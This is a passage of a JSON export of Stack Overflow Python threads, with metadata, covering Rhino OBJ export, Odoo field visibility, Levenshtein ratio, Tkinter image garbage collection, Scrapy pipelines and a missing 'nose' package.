ended/////////////\"\n</code></pre>\n"}], "owner": {"reputation": 2612, "user_id": 3311552, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/QO7aK.jpg?s=128&g=1", "display_name": "Radio", "link": "https://stackoverflow.com/users/3311552/radio"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2958, "favorite_count": 0, "accepted_answer_id": 29495558, "answer_count": 2, "score": 2, "last_activity_date": 1428421266, "creation_date": 1427927113, "last_edit_date": 1427928289, "question_id": 29401951, "link": "https://stackoverflow.com/questions/29401951/export-layers-as-obj-from-rhino3d", "title": "Export layers as obj from Rhino3d", "body": "<p><strong>The task</strong></p>\n\n<p>Export layers as obj files from Rhino.</p>\n\n<p><strong>The issue</strong></p>\n\n<p>When using Python scripting, I run an export command. Instead of exporting the model, a dialog is presented in the interface. If I click the export interface, it works fine. However it brings up the dialog box for every layer. I have many many layers though and I would like to automate the entire export process.</p>\n\n<p><em>The end goal is to display the obj files in webGL via three.js.</em></p>\n\n<p>I am new to Python and Rhino, but know PHP and JavaScript, so I understand the concepts well enough and have watched a few tutorials on Python so I can begin working on this script.</p>\n\n<p><strong>What I have tried</strong></p>\n\n<p>I am using Rhino, Atom/Python.</p>\n\n<pre><code>import scriptcontext\nimport rhinoscriptsyntax as rs\nfrom Rhino.Geometry import Point3d\n\ndef layerNames(sort=False):\n    rc = []\n    for layer in scriptcontext.doc.Layers:\n        if not layer.IsDeleted: rc.append(layer.FullPath)\n    if sort: rc.sort()\n    return rc\n\n\nrs.EnableRedraw(False)\n\nstrPath = rs.DocumentPath()\nstrName = rs.DocumentName()\n\narrLayers = layerNames(False)\nfor layerName in arrLayers:\n    objs = scriptcontext.doc.Objects.FindByLayer(layerName)\n    rs.Command(\"_-Export \"+layerName+\".obj\", False) \n</code></pre>\n\n<p><strong>Notes</strong></p>\n\n<p>I was thinking of using python native file saving (open(\"layername.json\", \"a\"). The thought is to somehow get the mesh from the objects in each layer, convert that to <a href=\"https://github.com/mrdoob/three.js/wiki/JSON-Geometry-format-4\" rel=\"nofollow\">three.js json</a> and use that instead. But I don't know how to get a mesh from a layer. I have imported Rhino.Geometry to see if it was helpful. I don't know how to find a mesh to convert, or if I can somehow use the native export command in an automated fashion and just use obj files.</p>\n"}, {"tags": ["python", "xml", "openerp", "odoo-8"], "answers": [{"comments": [{"owner": {"reputation": 342, "user_id": 4149711, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/ebfe77052bd3054914634a2d7f67558d?s=128&d=identicon&r=PG&f=1", "display_name": "E. Peterson", "link": "https://stackoverflow.com/users/4149711/e-peterson"}, "edited": false, "score": 0, "creation_date": 1427977275, "post_id": 29404965, "comment_id": 46998338, "body": "Getting errors using the following lines of XML: \t\t\t\t&lt;field name=&quot;website&quot; position=&quot;after&quot;&gt;                     &lt;field name=&quot;related_partner_id&quot; attrs=&quot;{&#39;invisible&#39;: [(&#39;related_partner_ids&#39;,&#39;!=&#39;, False)]}&quot;/&gt;                &lt;field name=&quot;related_partner_ids&quot;  invisible=&quot;1&quot;/&gt;                &lt;label string=&quot;Master Account&quot; attrs=&quot;{&#39;invisible&#39;: [[&#39;related_partner_id&#39;, &#39;!=&#39;, False]]}&quot;/&gt;"}, {"owner": {"reputation": 14070, "user_id": 4093735, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/6hzqH.png?s=128&g=1", "display_name": "Emipro Technologies Pvt. Ltd.", "link": "https://stackoverflow.com/users/4093735/emipro-technologies-pvt-ltd"}, "reply_to_user": {"reputation": 342, "user_id": 4149711, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/ebfe77052bd3054914634a2d7f67558d?s=128&d=identicon&r=PG&f=1", "display_name": "E. Peterson", "link": "https://stackoverflow.com/users/4149711/e-peterson"}, "edited": false, "score": 0, "creation_date": 1427980260, "post_id": 29404965, "comment_id": 47000270, "body": "What is the error ?, you need to update your module as well, because there are changes in columns structure  also."}], "tags": [], "owner": {"reputation": 14070, "user_id": 4093735, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/6hzqH.png?s=128&g=1", "display_name": "Emipro Technologies Pvt. Ltd.", "link": "https://stackoverflow.com/users/4093735/emipro-technologies-pvt-ltd"}, "is_accepted": false, "score": 5, "last_activity_date": 1449309367, "last_edit_date": 1449309367, "creation_date": 1427948683, "answer_id": 29404965, "question_id": 29401948, "link": "https://stackoverflow.com/questions/29401948/hide-one2many-field-conditionally-odoo-openerp/29404965#29404965", "title": "Hide One2many field Conditionally Odoo/OpenERP", "body": "<p>Try following,</p>\n\n<pre><code>from openerp import models, fields, api, _\n\nclass res_partner(models.Model):\n    _inherit = 'res.partner'\n\n    related_partner_id = fields.Many2one('res.partner', 'Master Account')\n    related_partner_ids = fields.One2many('res.partner', 'related_partner_id', 'Master Account')\n</code></pre>\n\n<p><strong>One2many</strong> required inverse field id as well. \nAnd set attrs like this,</p>\n\n<pre><code>&lt;field name=\"related_partner_id\" attrs=\"{'invisible': [('related_partner_ids','!=', False)]}\"/&gt;\n</code></pre>\n\n<p>Or You should write like this</p>\n\n<pre><code>&lt;field name=\"related_partner_id\" attrs=\"{'invisible': [('related_partner_ids','!=', [])]}\"/&gt;\n</code></pre>\n\n<p>For <strong>Many2many</strong> fields, attrs should be applied in following manner.</p>\n\n<pre><code>&lt;field name=\"m2m_field\" attrs=\"{'invisible': [('m2m_field','=', [(6,0,[])])]}\"/&gt;\n</code></pre>\n"}], "owner": {"reputation": 342, "user_id": 4149711, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/ebfe77052bd3054914634a2d7f67558d?s=128&d=identicon&r=PG&f=1", "display_name": "E. Peterson", "link": "https://stackoverflow.com/users/4149711/e-peterson"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2836, "favorite_count": 1, "answer_count": 1, "score": 3, "last_activity_date": 1449309507, "creation_date": 1427927107, "last_edit_date": 1449309507, "question_id": 29401948, "link": "https://stackoverflow.com/questions/29401948/hide-one2many-field-conditionally-odoo-openerp", "title": "Hide One2many field Conditionally Odoo/OpenERP", "body": "<p>I am creating an option called Master Account within the customer portion of an Odoo 8.0 setup. If selected, it will set another account as the grandparent. This is useful for companies/customers who have multiple locations, but just one billing center. I was able to apply this functionality, but now I do not want to display the option to set a master account to a company that is already set as someone's master. </p>\n\n<p>I have tried the following and it does not work:</p>\n\n<p>PYTHON</p>\n\n<pre><code>from openerp import models, fields, api, _\n\nclass res_partner(models.Model):\n    _inherit = 'res.partner'\n\n    related_partner_id = fields.Many2one('res.partner', 'Master Account')\n    related_partner_ids = fields.One2many('res.partner', 'Master Account')\n</code></pre>\n\n<p>XML</p>\n\n<pre><code>&lt;?xml version=\"1.0\" ?&gt;\n&lt;openerp&gt;\n    &lt;data&gt;\n        &lt;record model=\"ir.ui.view\" id=\"base_view_partner_demo_inherit\"&gt;\n            &lt;field name=\"name\"&gt;res.partner.form.demo&lt;/field&gt;\n            &lt;field name=\"model\"&gt;res.partner&lt;/field&gt;\n            &lt;field name=\"inherit_id\" ref=\"base.view_partner_form\" /&gt;\n            &lt;field name=\"arch\" type=\"xml\"&gt;\n                &lt;field name=\"website\" position=\"after\"&gt;\n                    &lt;field name=\"related_partner_id\" attrs=\"{'invisible': [('related_partner_ids','&gt;', '0')]}\"/&gt;\n               &lt;field name=\"related_partner_ids\"  invisible=\"1\"/&gt;\n               &lt;label string=\"Master Account\" attrs=\"{'invisible': [['related_partner_id', '!=', False]]}\"/&gt;\n                &lt;/field&gt;\n            &lt;/field&gt;\n        &lt;/record&gt;\n\n\n    &lt;/data&gt;\n&lt;/openerp&gt;\n</code></pre>\n\n<p>Any help would be greatly appreciated. I'm brand new to Odoo. </p>\n"}, {"tags": ["python"], "comments": [{"owner": {"reputation": 123382, "user_id": 1252759, "user_type": "moderator", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/aGFfT.jpg?s=128&g=1", "display_name": "Jon Clements", "link": "https://stackoverflow.com/users/1252759/jon-clements"}, "edited": false, "score": 1, "creation_date": 1427927033, "post_id": 29401904, "comment_id": 46979309, "body": "Have you looked at how <code>Levenshtein.ratio</code> works?"}, {"owner": {"reputation": 96308, "user_id": 651174, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/2e2d79b9350ef4ebf04ac0ad5816a5c3?s=128&d=identicon&r=PG", "display_name": "David542", "link": "https://stackoverflow.com/users/651174/david542"}, "reply_to_user": {"reputation": 123382, "user_id": 1252759, "user_type": "moderator", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/aGFfT.jpg?s=128&g=1", "display_name": "Jon Clements", "link": "https://stackoverflow.com/users/1252759/jon-clements"}, "edited": false, "score": 0, "creation_date": 1427927355, "post_id": 29401904, "comment_id": 46979431, "body": "@JonClements yes -- please see updated question."}], "owner": {"reputation": 96308, "user_id": 651174, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/2e2d79b9350ef4ebf04ac0ad5816a5c3?s=128&d=identicon&r=PG", "display_name": "David542", "link": "https://stackoverflow.com/users/651174/david542"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 63, "favorite_count": 0, "closed_date": 1427927373, "answer_count": 0, "score": 1, "last_activity_date": 1427927387, "creation_date": 1427926927, "last_edit_date": 1427927387, "question_id": 29401904, "link": "https://stackoverflow.com/questions/29401904/how-is-levenshtein-distance-related-to-ratio", "closed_reason": "Duplicate", "title": "How is Levenshtein distance related to ratio?", "body": "<p>How is the ratio computed from the distance?</p>\n\n<pre><code># https://pypi.python.org/pypi/python-Levenshtein/\n&gt;&gt;&gt; Levenshtein.distance('bjork gudmundsdottir', 'b. gudmundsson gunnar')\n12\n&gt;&gt;&gt; len('bjork gudmundsdottir') + len('b. gudmundsson gunnar')\n41\n&gt;&gt;&gt; Levenshtein.ratio('bjork gudmundsdottir', 'b. gudmundsson gunnar')\n0.5853658536585366\n</code></pre>\n\n<p>I thought it was <code>(dist-len)/len</code>, but that seems incorrect. How is the above value of <code>0.58</code> arrived at?</p>\n\n<p>Here is the closest I can get:</p>\n\n<pre><code>&gt;&gt;&gt; Ldist / max(len( a ), len( b ))\n&gt;&gt;&gt; float(12)/21\n0.5714285714285714\n</code></pre>\n\n<p>But still, this is off by <code>.01</code>. What would be the exact formula here?</p>\n"}, {"tags": ["python", "function", "tkinter", "python-imaging-library"], "answers": [{"comments": [{"owner": {"reputation": 44584, "user_id": 2617068, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0nSBO.png?s=128&g=1", "display_name": "TigerhawkT3", "link": "https://stackoverflow.com/users/2617068/tigerhawkt3"}, "edited": false, "score": 0, "creation_date": 1427927459, "post_id": 29401903, "comment_id": 46979461, "body": "It&#39;s supposed to be a local version, though, that only appears in the new <code>Toplevel</code> window."}, {"owner": {"reputation": 102532, "user_id": 248823, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/6605deca5924e84df1a4847f607b87c6?s=128&d=identicon&r=PG", "display_name": "Marcin", "link": "https://stackoverflow.com/users/248823/marcin"}, "reply_to_user": {"reputation": 44584, "user_id": 2617068, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0nSBO.png?s=128&g=1", "display_name": "TigerhawkT3", "link": "https://stackoverflow.com/users/2617068/tigerhawkt3"}, "edited": false, "score": 0, "creation_date": 1427927654, "post_id": 29401903, "comment_id": 46979550, "body": "@TigerhawkT3 So it wont work. <code>tkimg</code> is still being garbage collected when <code>Services</code> function finish. Need to make other global variable to hold the reference to the image you want to use."}, {"owner": {"reputation": 79, "user_id": 4740177, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-U0MesJwpyng/AAAAAAAAAAI/AAAAAAAAAMs/OW0H9JYEfS0/photo.jpg?sz=128", "display_name": "Nitroxko", "link": "https://stackoverflow.com/users/4740177/nitroxko"}, "edited": false, "score": 0, "creation_date": 1427927826, "post_id": 29401903, "comment_id": 46979619, "body": "It works as you said, I made the <code>tkimg</code> a global and it worled."}], "tags": [], "owner": {"reputation": 102532, "user_id": 248823, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/6605deca5924e84df1a4847f607b87c6?s=128&d=identicon&r=PG", "display_name": "Marcin", "link": "https://stackoverflow.com/users/248823/marcin"}, "is_accepted": true, "score": 6, "last_activity_date": 1427926925, "creation_date": 1427926925, "answer_id": 29401903, "question_id": 29401873, "link": "https://stackoverflow.com/questions/29401873/tkinter-pil-image-not-displaying-inside-of-a-function/29401903#29401903", "title": "Tkinter PIL image not displaying inside of a function", "body": "<p>It does not work inside function, since <code>tkimg</code> is garbage collected after function finishes. You need to bind your images into variables that wont be garbage collected. For example to global variables, or instance variables in a class, rather than local variables.</p>\n\n<p>To make <code>tkimg</code> be able to write to the global <code>tkimg</code> use <code>global tkimg</code> in the function. </p>\n"}], "owner": {"reputation": 79, "user_id": 4740177, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-U0MesJwpyng/AAAAAAAAAAI/AAAAAAAAAMs/OW0H9JYEfS0/photo.jpg?sz=128", "display_name": "Nitroxko", "link": "https://stackoverflow.com/users/4740177/nitroxko"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1901, "favorite_count": 1, "accepted_answer_id": 29401903, "answer_count": 1, "score": 4, "last_activity_date": 1427927111, "creation_date": 1427926807, "last_edit_date": 1427927111, "question_id": 29401873, "link": "https://stackoverflow.com/questions/29401873/tkinter-pil-image-not-displaying-inside-of-a-function", "title": "Tkinter PIL image not displaying inside of a function", "body": "<p>I am using Tkinter to display images in a Toplevel() but when I put it inside of a function it doesn't work(This is very beginner I know)</p>\n\n<pre><code> # -*- coding: utf-8 -*-\nimport Tkinter\nfrom Tkinter import *\nimport tkMessageBox\nfrom tkMessageBox import *\nimport Image, ImageTk\nimport PIL.Image, PIL.ImageTk\nimport os\nimport subprocess\n\n\nroot = Tk()\nroot.title(\"Test\")\nquin=Toplevel()    \nC = Tkinter.Canvas(quin, bg=\"white\", height = 350, width = 350)   \ndirectory=os.path.dirname(os.path.abspath(__file__))\nfilename=os.path.join(directory, 'un.png')\nimg=PIL.Image.open(filename)\ntkimg=PIL.ImageTk.PhotoImage(img)\nimage = C.create_image(175,175,image=tkimg)\nC.grid(row=5,column=5)\ndef Head():\n     h1 = Label(root, text = \"How to Secure a Computer\", fg =\"white\", bg = \"#00b8ff\", width = 6,bd=2, height =2, font = \"Arial\", relief = RAISED)\n     h1.grid(row= 0, column = 0, ipadx=122, pady=3, padx=5,columnspan=3)\ndef Mainmenu():\n    menubar = Menu(root)\n    filemenu = Menu(menubar, tearoff=0)\n    filemenu.add_command(label=\"Exit\", command=root.destroy)\n    menubar.add_cascade(label=\"Options\", menu=filemenu)\n    helpmenu = Menu(menubar, tearoff=0)\n    helpmenu.add_radiobutton(label=\"Help\")\n    helpmenu.add_radiobutton(label=\"User Manual Security Configuration Guide\")\n    menubar.add_cascade(label=\"Help\", menu=helpmenu)\n    root.config(menu=menubar)\n\ndef Mainbuttons():\n    B1=Button(root,text=\"Services\",height=2, width=6,bd=2, font = \"Arial\", fg = \"#FFFFFF\", bg = \"#156cff\",command=Services)\n    B2=Button(root,text=\"Account Policies\",height=2, width=6,bd=2, font = \"Arial\", fg = \"#FFFFFF\", bg = \"#156cff\")\n    B3=Button(root,text=\"Firewall Config\",height=2, width=6,bd=2, font = \"Arial\", fg = \"#FFFFFF\", bg = \"#156cff\")\n    B4=Button(root,text=\"User Logon Time\",height=2, width=6,bd=2, font = \"Arial\", fg = \"#FFFFFF\", bg = \"#156cff\")\n    B5=Button(root,text=\"Security Policies\",height=2, width=6,bd=2, font = \"Arial\", fg = \"#FFFFFF\", bg = \"#156cff\")\n    B1.grid(row = 1, column = 0, ipadx=120,pady=2,padx=5)\n    B2.grid(row = 1, column = 1, ipadx=120,pady=2,padx=5)\n    B3.grid(row = 2, column = 1, ipadx=120,pady=2,padx=5)\n    B4.grid(row = 2, column = 0, ipadx=120,pady=2,padx=5)\n    B5.grid(row = 3, column = 0, ipadx=120,pady=2,padx=5)\n\ndef Services():\n    serv=Toplevel()\n    servcanv=Canvas(serv,height=250, width=250)\n    servtext=Text(serv,width=26)\n    servtext.insert(INSERT, \"To start go to your start menu, in the search bar\\ntype services.msc\")\n    servtext.grid(row=0, column=0)\n    servcanv.grid(row=0, column=1)\n    s = Tkinter.Canvas(serv, bg=\"white\", height = 350, width = 350)   \n    directory=os.path.dirname(os.path.abspath(__file__))\n    filename=os.path.join(directory, 'un.png')\n    img=PIL.Image.open(filename)\n    tkimg=PIL.ImageTk.PhotoImage(img)\n    image=s.create_image(175,175,image=tkimg)\n    s.grid(row=5,column=5)\n\n\n\n\n\nMainmenu()\nMainbuttons()   \nHead()\nroot.mainloop()\n</code></pre>\n\n<p>As you can see the code used to display the image is used twice, once inside a function and once outside. When outside it works perfectly, but when inside it doesn't work, it says the variable image is assigned but never used.</p>\n"}, {"tags": ["python", "json", "scrapy"], "comments": [{"owner": {"reputation": 411841, "user_id": 771848, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/2DTBv.jpg?s=128&g=1", "display_name": "alecxe", "link": "https://stackoverflow.com/users/771848/alecxe"}, "edited": false, "score": 2, "creation_date": 1427926648, "post_id": 29401789, "comment_id": 46979163, "body": "Create a pipeline? See <a href=\"http://stackoverflow.com/a/27744766/771848\">this answer</a> (unofficial tutorial)."}], "answers": [{"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user513418"}, "is_accepted": false, "score": 2, "last_activity_date": 1445564558, "creation_date": 1445564558, "answer_id": 33293553, "question_id": 29401789, "link": "https://stackoverflow.com/questions/29401789/scrapy-when-calling-scrapy-from-script-how-to-return-a-dictionary-to-the-pro/33293553#33293553", "title": "Scrapy -- When calling scrapy from script, how to return a dictionary to the process immediately, instead of export to json file", "body": "<p>Feed exports are meant to serialize the data you've scraped (see <a href=\"http://doc.scrapy.org/en/latest/topics/feed-exports.html#topics-feed-format\" rel=\"nofollow\">feed export documentation</a>). What you are trying to do doesn't involve serialization.</p>\n\n<p>What you want to do instead is create a <a href=\"http://doc.scrapy.org/en/latest/topics/item-pipeline.html#topics-item-pipeline\" rel=\"nofollow\">pipeline</a>. Scrapy will pass scraped <code>Items</code> to the pipeline. They are dictionaries, and you can do whatever you want with them.</p>\n"}], "owner": {"reputation": 627, "user_id": 1819047, "user_type": "registered", "accept_rate": 15, "profile_image": "https://www.gravatar.com/avatar/583fd9e6b13dc5ee075616dba5733a48?s=128&d=identicon&r=PG", "display_name": "user1819047", "link": "https://stackoverflow.com/users/1819047/user1819047"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 574, "favorite_count": 3, "answer_count": 1, "score": 9, "last_activity_date": 1445564558, "creation_date": 1427926419, "last_edit_date": 1427926670, "question_id": 29401789, "link": "https://stackoverflow.com/questions/29401789/scrapy-when-calling-scrapy-from-script-how-to-return-a-dictionary-to-the-pro", "title": "Scrapy -- When calling scrapy from script, how to return a dictionary to the process immediately, instead of export to json file", "body": "<p><a href=\"http://doc.scrapy.org/en/latest/topics/practices.html\">The official tutorial</a> specifies the way on how to call scrapy within python script</p>\n\n<p>By changing the following setting attributes:</p>\n\n<pre><code>settings.overrides['FEED_URI'] = output_path\nsettings.overrides['FEED_FORMAT'] = 'json'\n</code></pre>\n\n<p>I am able to store the data scraped in a json file.</p>\n\n<p>However, I'm trying to process and return the data scraped immediately within the function I defined. Hence, other functions can call this wrapper function in order to scrap some websites.</p>\n\n<p>I figure there must be some settings I can play with <code>FEED_URI</code>, but I am not sure. Any advice will be appreciated deeply!</p>\n"}, {"tags": ["python", "installation", "importerror", "nose"], "comments": [{"owner": {"reputation": 26111, "user_id": 2750492, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fTVM8.jpg?s=128&g=1", "display_name": "AChampion", "link": "https://stackoverflow.com/users/2750492/achampion"}, "edited": false, "score": 0, "creation_date": 1427926775, "post_id": 29401707, "comment_id": 46979215, "body": "Are you installing the right version of nose, suitable for your version of python?"}, {"owner": {"reputation": 71, "user_id": 4740176, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-4enUgkYKvS4/AAAAAAAAAAI/AAAAAAAAAKo/YBA2t4tOfro/photo.jpg?sz=128", "display_name": "oneplusoneisone", "link": "https://stackoverflow.com/users/4740176/oneplusoneisone"}, "reply_to_user": {"reputation": 26111, "user_id": 2750492, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fTVM8.jpg?s=128&g=1", "display_name": "AChampion", "link": "https://stackoverflow.com/users/2750492/achampion"}, "edited": false, "score": 0, "creation_date": 1427927129, "post_id": 29401707, "comment_id": 46979346, "body": "I think so.. I install module for python34..  To be honest.. I am not sure what this nose actually is..  I just downloaded sklearn, numpy, and matplotlib for k mean clustering.."}, {"owner": {"reputation": 538898, "user_id": 104349, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/0f4cefeedec5163556751d61625eedd0?s=128&d=identicon&r=PG", "display_name": "Daniel Roseman", "link": "https://stackoverflow.com/users/104349/daniel-roseman"}, "edited": false, "score": 0, "creation_date": 1427927271, "post_id": 29401707, "comment_id": 46979399, "body": "If you don&#39;t know what it is, why are you trying to install it?"}, {"owner": {"reputation": 26111, "user_id": 2750492, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fTVM8.jpg?s=128&g=1", "display_name": "AChampion", "link": "https://stackoverflow.com/users/2750492/achampion"}, "edited": false, "score": 1, "creation_date": 1427927598, "post_id": 29401707, "comment_id": 46979522, "body": "nose is a testing framework that many packages use. Does pip point to python3 or do you need to use <code>pip3 install nose</code>"}, {"owner": {"reputation": 71, "user_id": 4740176, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-4enUgkYKvS4/AAAAAAAAAAI/AAAAAAAAAKo/YBA2t4tOfro/photo.jpg?sz=128", "display_name": "oneplusoneisone", "link": "https://stackoverflow.com/users/4740176/oneplusoneisone"}, "edited": false, "score": 0, "creation_date": 1427927631, "post_id": 29401707, "comment_id": 46979541, "body": "i just installed sklearn, numpy, and matlplotlib  I did not type any word close to nose but above error showed up ..  That is why I am trying to install whatever nose is.. Right now because of that error, i cannot see any output"}, {"owner": {"reputation": 71, "user_id": 4740176, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-4enUgkYKvS4/AAAAAAAAAAI/AAAAAAAAAKo/YBA2t4tOfro/photo.jpg?sz=128", "display_name": "oneplusoneisone", "link": "https://stackoverflow.com/users/4740176/oneplusoneisone"}, "edited": false, "score": 0, "creation_date": 1427927768, "post_id": 29401707, "comment_id": 46979598, "body": "I just tried pip3 install nose, however, it is still giving me a syntax error message. What did I do wrong.."}, {"owner": {"reputation": 26111, "user_id": 2750492, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fTVM8.jpg?s=128&g=1", "display_name": "AChampion", "link": "https://stackoverflow.com/users/2750492/achampion"}, "edited": false, "score": 0, "creation_date": 1427927864, "post_id": 29401707, "comment_id": 46979641, "body": "You may need to uninstall and reinstall if you have an invalid installation."}, {"owner": {"reputation": 71, "user_id": 4740176, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-4enUgkYKvS4/AAAAAAAAAAI/AAAAAAAAAKo/YBA2t4tOfro/photo.jpg?sz=128", "display_name": "oneplusoneisone", "link": "https://stackoverflow.com/users/4740176/oneplusoneisone"}, "edited": false, "score": 0, "creation_date": 1427928017, "post_id": 29401707, "comment_id": 46979691, "body": "Which one should I uninstall it? pip? three moduels? or the whole python :("}, {"owner": {"reputation": 26111, "user_id": 2750492, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fTVM8.jpg?s=128&g=1", "display_name": "AChampion", "link": "https://stackoverflow.com/users/2750492/achampion"}, "edited": false, "score": 0, "creation_date": 1427933831, "post_id": 29401707, "comment_id": 46981434, "body": "just the packages, pip3 uninstall nose numpy scikit-learn scipy and then reinstall, make sure you are installing in the right python environment. Virtualenv&#39;s are very good to isolate package dependencies."}, {"owner": {"reputation": 6122, "user_id": 2197181, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/b8bfa78665dc670a7cbf3982432b2bb8?s=128&d=identicon&r=PG", "display_name": "JulienD", "link": "https://stackoverflow.com/users/2197181/juliend"}, "edited": false, "score": 0, "creation_date": 1468143991, "post_id": 29401707, "comment_id": 63998746, "body": "I created a new Python3 virtualenv, pip3 install nose, and still I am getting the same error. Worse, I can do <code>python3 -c &quot;from nose.tools import assert_raises&quot;</code> without error."}], "answers": [{"tags": [], "owner": {"reputation": 749, "user_id": 891424, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/6851a6b7c850fd6701119d31cf90946e?s=128&d=identicon&r=PG", "display_name": "Abhinav Sood", "link": "https://stackoverflow.com/users/891424/abhinav-sood"}, "is_accepted": false, "score": 1, "last_activity_date": 1541017385, "creation_date": 1541017385, "answer_id": 53091400, "question_id": 29401707, "link": "https://stackoverflow.com/questions/29401707/importerror-no-module-named-nose/53091400#53091400", "title": "ImportError: No module named &#39;nose&#39;", "body": "<p>I think your <code>pip3</code> and <code>python3</code> versions are mismatched, possibly due to multiple versions of Python 3 installed.</p>\n\n<p>Run <code>pip3 --version</code> to find the exact Python version that pip3 is associated with and the location of site-packages directory.</p>\n\n<p>Then, run <code>python3</code> and look at the location of site-packages using:</p>\n\n<pre><code>import site\nsite.getsitepackages()\n</code></pre>\n\n<p>If you see different directory locations then that's your problem - multiple versions of Python 3. If it is indeed the problem, remove both the versions, re-install the correct one and then install your packages.</p>\n\n<p>I hope this helps!</p>\n"}], "owner": {"reputation": 71, "user_id": 4740176, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-4enUgkYKvS4/AAAAAAAAAAI/AAAAAAAAAKo/YBA2t4tOfro/photo.jpg?sz=128", "display_name": "oneplusoneisone", "link": "https://stackoverflow.com/users/4740176/oneplusoneisone"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 9814, "favorite_count": 3, "answer_count": 1, "score": 7, "last_activity_date": 1541017385, "creation_date": 1427926055, "last_edit_date": 1427926853, "question_id": 29401707, "link": "https://stackoverflow.com/questions/29401707/importerror-no-module-named-nose", "title": "ImportError: No module named &#39;nose&#39;", "body": "<p>I tried to help('modules') and there was no nose module. </p>\n\n<p>I even tried pip install nose, sudo pip install nose, and etc..</p>\n\n<p>When ever I tried to install nose with command line, it will throw out </p>\n\n<pre><code>SyntaxError: invalid syntax.\nTraceback (most recent call last):\n  File \"C:\\Python34\\plot_cluster_iris.py\", line 31, in &lt;module&gt;\n    from sklearn.cluster import KMeans\n  File \"C:\\Python34\\lib\\site-packages\\sklearn\\cluster\\__init__.py\", line 6, in &lt;module&gt;\n    from .spectral import spectral_clustering, SpectralClustering\n  File \"C:\\Python34\\lib\\site-packages\\sklearn\\cluster\\spectral.py\", line 13, in &lt;module&gt;\n    from ..utils import check_random_state, as_float_array\n  File \"C:\\Python34\\lib\\site-packages\\sklearn\\utils\\__init__.py\", line 11, in &lt;module&gt;\n    from .validation import (as_float_array, check_arrays, safe_asarray,\n  File \"C:\\Python34\\lib\\site-packages\\sklearn\\utils\\validation.py\", line 17, in &lt;module&gt;\n    from .fixes import safe_copy\n  File \"C:\\Python34\\lib\\site-packages\\sklearn\\utils\\fixes.py\", line 18, in &lt;module&gt;\n    from .testing import ignore_warnings\n  File \"C:\\Python34\\lib\\site-packages\\sklearn\\utils\\testing.py\", line 36, in &lt;module&gt;\n    from nose.tools import assert_equal\n</code></pre>\n\n<p>What should I do?</p>\n"}, {"tags": ["python"], "comments": [{"owner": {"reputation": 538898, "user_id": 104349, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/0f4cefeedec5163556751d61625eedd0?s=128&d=identicon&r=PG", "display_name": "Daniel Roseman", "link": "https://stackoverflow.com/users/104349/daniel-roseman"}, "edited": false, "score": 3, "creation_date": 1427926041, "post_id": 29401690, "comment_id": 46978942, "body": "Why would it print 10? Where do you think that would come from?"}], "answers": [{"comments": [{"owner": {"reputation": 538898, "user_id": 104349, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/0f4cefeedec5163556751d61625eedd0?s=128&d=identicon&r=PG", "display_name": "Daniel Roseman", "link": "https://stackoverflow.com/users/104349/daniel-roseman"}, "edited": false, "score": 1, "creation_date": 1427926098, "post_id": 29401709, "comment_id": 46978964, "body": "But more to the point, OP hasn&#39;t even called the <code>add</code> method."}, {"owner": {"reputation": 1684, "user_id": 4403123, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3d6cb94cda55242f6537bba6d90e09b?s=128&d=identicon&r=PG&f=1", "display_name": "KSFT", "link": "https://stackoverflow.com/users/4403123/ksft"}, "reply_to_user": {"reputation": 538898, "user_id": 104349, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/0f4cefeedec5163556751d61625eedd0?s=128&d=identicon&r=PG", "display_name": "Daniel Roseman", "link": "https://stackoverflow.com/users/104349/daniel-roseman"}, "edited": false, "score": 0, "creation_date": 1427926129, "post_id": 29401709, "comment_id": 46978980, "body": "@DanielRoseman You&#39;re right. I didn&#39;t even notice that when I first read the question."}, {"owner": {"reputation": 273, "user_id": 4723993, "user_type": "registered", "accept_rate": 55, 